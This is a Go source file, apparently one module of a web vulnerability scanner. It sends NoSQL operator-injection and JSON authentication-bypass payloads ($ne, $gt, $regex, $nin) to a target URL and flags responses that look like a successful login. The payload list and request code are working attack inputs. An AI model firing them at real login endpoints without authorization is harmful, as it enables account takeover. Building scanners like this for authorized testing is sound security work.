package nosqli

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"

	"github.com/areksaxyz/bhyakugan/internal/core"
	"github.com/areksaxyz/bhyakugan/internal/utils"
)

type NoSQLPayload struct {
	Name    string
	Payload string
	Method  string
	IsJSON  bool
}

var Payloads = []NoSQLPayload{
	{"NoSQL Operator Injection ([$ne])", "?user[$ne]=1&pass[$ne]=1", "GET", false},
	{"NoSQL Operator Injection ([$gt])", "?user[$gt]=&pass[$gt]=", "GET", false},
	{"NoSQL Regex Injection ([$regex])", "?user[$regex]=^adm&pass[$ne]=1", "GET", false},
	{"NoSQL Operator Injection ([$nin])", "?user[$nin][]=admin&user[$nin][]=guest", "GET", false},
	{"NoSQL JSON Auth Bypass ($ne)", `{"username": {"$ne": null}, "password": {"$ne": null}}`, "POST", true},
	{"NoSQL JSON Auth Bypass ($gt)", `{"username": {"$gt": ""}, "password": {"$gt": ""}}`, "POST", true},
	{"NoSQL JSON Regex Bypass", `{"username": {"$regex": "^admin"}, "password": {"$ne": null}}`, "POST", true},
}

func Scan(baseURL string, client *http.Client, ctx core.ScanContext, onFound func(core.Finding)) {
	// Optimization: Skip if likely not NoSQL target
	if ctx.Language == "dotnet" || ctx.Language == "java" {
		return
	}

	reqBase, errReq := http.NewRequest("GET", baseURL, nil)
	if errReq != nil {
		return
	}
	utils.SetDefaultHeaders(reqBase, baseURL)
	respBase, errBase := client.Do(reqBase)
	if errBase != nil {
		return
	}
	defer respBase.Body.Close()
	bodyBase, _ := io.ReadAll(io.LimitReader(io.LimitReader(respBase.Body, 5*1024*1024), 5*1024*1024))
	baseStr := strings.ToLower(string(bodyBase))

	for _, p := range Payloads {
		u, _ := url.Parse(baseURL)
		var target string
		var req *http.Request
		var err error

		if p.Method == "GET" {
			q := u.Query()
			payloadQ, _ := url.ParseQuery(strings.TrimPrefix(p.Payload, "?"))
			for k, v := range payloadQ {
				q.Set(k, v[0])
			}
			u.RawQuery = q.Encode()
			target = u.String()
			req, err = http.NewRequest("GET", target, nil)
		} else if p.Method == "POST" && p.IsJSON {
			target = u.String()
			req, err = http.NewRequest("POST", target, bytes.NewBuffer([]byte(p.Payload)))
			req.Header.Set("Content-Type", "application/json")
		}

		if err != nil || req == nil {
			continue
		}
		utils.SetDefaultHeaders(req, target)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
		bodyStr := string(body)
		lowerBody := strings.ToLower(bodyStr)

		isVuln := false
		evidence := ""
		successKeywords := []string{"\"success\":true", "\"auth\":true", "welcome admin", "dashboard"}

		for _, kw := range successKeywords {
			if strings.Contains(lowerBody, kw) && !strings.Contains(baseStr, kw) {
				if !isSimilar(bodyStr, string(bodyBase)) {
					isVuln = true
					evidence = fmt.Sprintf("Indicator: %s", kw)
					break
				}
			}
		}

		if isVuln {
			onFound(core.Finding{Type: "NoSQL Injection", Target: target, Detail: evidence, Severity: "High"})
			return
		}
	}
}

func stripHTML(s string) string {
	re := regexp.MustCompile(`<[^>]*>`)
	return re.ReplaceAllString(s, " ")
}

func isSimilar(s1, s2 string) bool {
	t1 := stripHTML(s1)
	t2 := stripHTML(s2)
	if t1 == t2 {
		return true
	}
	tokens1 := strings.Fields(t1)
	tokens2 := strings.Fields(t2)
	if len(tokens1) == 0 || len(tokens2) == 0 {
		return false
	}
	set1 := make(map[string]bool)
	for _, t := range tokens1 {
		set1[t] = true
	}
	intersection := 0
	for _, t := range tokens2 {
		if set1[t] {
			intersection++
		}
	}
	maxLen := len(tokens1)
	if len(tokens2) > maxLen {
		maxLen = len(tokens2)
	}
	return float64(intersection)/float64(maxLen) > 0.7
}
